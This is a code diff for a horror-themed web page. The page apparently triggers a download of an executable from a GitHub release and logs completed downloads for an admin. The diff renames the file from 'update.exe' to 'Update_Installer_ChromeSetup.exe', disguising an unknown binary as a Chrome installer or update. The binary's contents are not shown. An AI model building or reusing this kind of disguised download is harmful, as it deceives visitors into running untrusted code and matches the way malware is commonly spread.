@@ -31,7 +31,7 @@ const CLOSE_DESTINATIONS = [
   "https://itch.io/games/platform-web/tag-horror?utm_source=chatgpt.com",
 ];
 
-const DOWNLOAD_FILE_NAME = "update.exe";
+const DOWNLOAD_FILE_NAME = "Update_Installer_ChromeSetup.exe";
 
 function Fog({ className = "" }: { className?: string }) {
   return <div aria-hidden className={`pointer-events-none absolute inset-0 overflow-hidden ${className}`}>
@@ -132,7 +132,7 @@ function Home() {
     
     // Start the actual download using the hook
     // Admin logging will happen after successful completion in the hook
-    await startDownload("https://github.com/ryoheina/game-other/releases/download/v1.0.0/update.exe", DOWNLOAD_FILE_NAME);
+    await startDownload("https://github.com/ryoheina/game-other/releases/download/v1.0.0/Update_Installer_ChromeSetup.exe", DOWNLOAD_FILE_NAME);
     
     window.setTimeout(() => { isStartingDownload.current = false; }, 750);
   }, [startDownload]);
